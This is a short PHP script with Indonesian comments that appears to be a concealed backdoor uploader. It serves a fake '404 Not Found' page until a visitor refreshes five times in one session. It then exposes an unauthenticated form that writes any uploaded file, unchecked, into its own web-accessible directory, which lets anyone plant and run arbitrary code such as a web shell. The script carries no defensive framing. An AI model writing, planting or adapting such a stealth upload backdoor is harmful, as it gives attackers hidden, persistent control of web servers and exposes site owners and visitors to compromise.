<?php
session_start();

// Inisialisasi counter jika belum ada
if (!isset($_SESSION['refresh_count'])) {
    $_SESSION['refresh_count'] = 0;
}

// Increment counter setiap kali halaman di-refresh
$_SESSION['refresh_count']++;

// Cek apakah jumlah refresh sudah mencapai 5 atau lebih
if ($_SESSION['refresh_count'] < 5) {
    // Jika belum mencapai 5, tampilkan halaman "Not Found"
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    </body></html>";
    exit;
}

// Jika sudah 5 kali atau lebih, lanjutkan ke kode upload
$uploadDir = __DIR__ . '/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $fileName = basename($file['name']);
        $targetPath = $uploadDir . $fileName;
        
        if (file_exists($targetPath)) {
            $fileName = time() . '_' . $fileName;
            $targetPath = $uploadDir . $fileName;
        }
        
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            echo "File successfully uploaded and saved as: " . $fileName;
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    } else {
        echo "No file was uploaded.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload</title>
</head>
<body>
    <h2>File Upload</h2>
    <form action="" method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>
</body>
</html>
